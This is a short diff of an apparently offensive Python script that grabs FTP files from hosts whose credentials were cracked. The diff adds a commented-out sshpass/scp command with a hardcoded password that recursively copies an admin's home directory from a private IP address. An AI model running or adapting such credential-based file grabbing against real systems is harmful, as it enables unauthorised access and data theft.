@@ -84,5 +84,9 @@ if __name__ == "__main__":
 				if match is not None:
 					print("\tgrabbing ftp files from " + str(match.group(2)))
 					get_ftp_files(match.group(1), match.group(2), match.group(3))
+
+# maybe use this vvv for ssh
+# sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
+
 	#show_cracked_info()
 	#print("===== Cracked info ========")
